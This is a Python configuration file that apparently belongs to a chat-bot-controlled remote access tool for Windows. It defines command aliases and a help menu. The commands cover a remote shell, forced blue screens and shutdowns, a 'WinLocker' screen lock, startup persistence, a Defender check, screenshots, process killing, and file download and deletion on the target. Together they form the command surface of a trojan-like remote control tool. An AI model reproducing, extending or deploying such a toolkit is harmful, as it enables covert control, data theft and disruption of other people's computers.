"""
commands configuration
"""

# Default commands {key: [commands]}
default = {
    # Admin
    "shell": ["Shell"],
    "changewp": ["ChangeWorkpath"],
    "bsod": ["Bsod"],
    "shutdown": ["Shutwown"],
    "restart": ["Restart"],
    "monitor": ["Monitor", "Display"],
    "stop": ["StopPolling"],
    "adduser": ["AddUser", "NewUser", "New"],
    "deluser": ["DeleteUser", "DelUser"],
    "getusers": ["Users", "U", "u"],
    "newbutton": ["NewButton", "Button", "B"],
    "resetkeyboard": ["ResetKeyboard", "ResetK"],

    # Other
    "screenshot": ["Screenshot"],   #
    "func": ["Functions", "F"],
    "speech": ["Say", "say"],
    "getprocesses": ["GetProcesses"],
    "killprocess": ["KillProcess", "Kill"],
    "findprocess": ["FindProcess", "FindP", "FP"],
    "startup": ["Startup"],
    "messagebox": ["Messagebox", "msg", "Message", "MessageBox"],
    "activetitle": ["ActiveTitle"],
    "alltitles": ["GetTitles"],
    "request": ["JsonRequest"],
    "getfile": ["DownloadFile"],
    "browser": ["OpenUrl", "url", "OpenLink"],
    "getdesktopname": ["DesktopName", "DN", "GetDN"],
    "getusername": ["CurrentUser", "GetUsername", "gu"],
    "defender": ["GetDefender"],
    "winlocker": ["WinLocker", "winlocker"],
    "alert": ["Alert", "alert"],
    "removef": ["Remove", "RemoveFile", "RF"]
}

# Commands without args
keyboard_c = [
    default['screenshot'], default['func'], default['getdesktopname'], default['getusername'],
    default['startup'], default['alltitles'], default['getprocesses'], default['getusers'],
    default['resetkeyboard'], default['stop'], default['bsod'], default['shutdown'], default['restart'],
    default['request'], default['activetitle'], default['defender']
]

# OutputLog
functions_as_string = f"""Data
/{default['request'][0]}
/{default['activetitle'][0]}
/{default['alltitles'][0]}
/{default['getusername'][0]}
/{default['getdesktopname'][0]}
/{default['getprocesses'][0]}
/{default['defender'][0]}
/{default['screenshot'][0]}

User Control (Only Admin)
/{default['changewp'][0]} [path]
/{default['adduser'][0]}
/{default['deluser'][0]}
/{default['getusers'][0]}

System
/{default['monitor'][0]} [on/off]
/{default['shell'][0]} [command]
/{default['startup'][0]}
/{default['shutdown'][0]}
/{default['restart'][0]}
/{default['bsod'][0]}

Markup
/{default['newbutton'][0]} (command)
/{default['resetkeyboard'][0]}

Processes
/{default['findprocess'][0]} [pattern]
/{default['killprocess'][0]} [name.exe]

Other
/{default['alert'][0]} [duration] [writing speed] (text)
/{default['speech'][0]} [rate] [voice_id] [vol] (text)
/{default['messagebox'][0]} [count] [title] (text)
/{default['winlocker'][0]} [duration] [color]
/{default['browser'][0]} [count] [url]

/{default['getfile'][0]} [path]
/{default['removef'][0]} [path]
/{default['stop'][0]} [path]

<strong>Notes</strong>
<i>
1. The sent ".mp3" file will be played immediately.
2. The sent image file will be used as wallpapers.
3. The sent document will be saved by path from the caption.
</i>
"""

